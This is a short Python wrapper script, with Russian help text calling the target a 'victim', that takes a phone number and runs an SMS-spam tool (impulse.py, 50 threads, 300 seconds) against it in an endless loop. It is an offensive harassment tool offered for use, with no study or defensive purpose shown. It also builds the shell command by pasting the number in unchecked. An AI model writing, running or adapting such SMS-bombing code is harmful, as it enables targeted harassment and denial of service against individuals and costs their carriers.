import os, argparse

# Parse args
parser = argparse.ArgumentParser(description="Спам на номер")
parser.add_argument(
    #"-n",
    "--number",
    type=str,                                                                   metavar="<number>",
    help="номер жертвы",
)

# Get args                                                                  
args = parser.parse_args()
number = args.number

cmd="python impulse.py --method SMS --time 300 --threads 50 --target "+number
while 1:
	os.system(cmd)
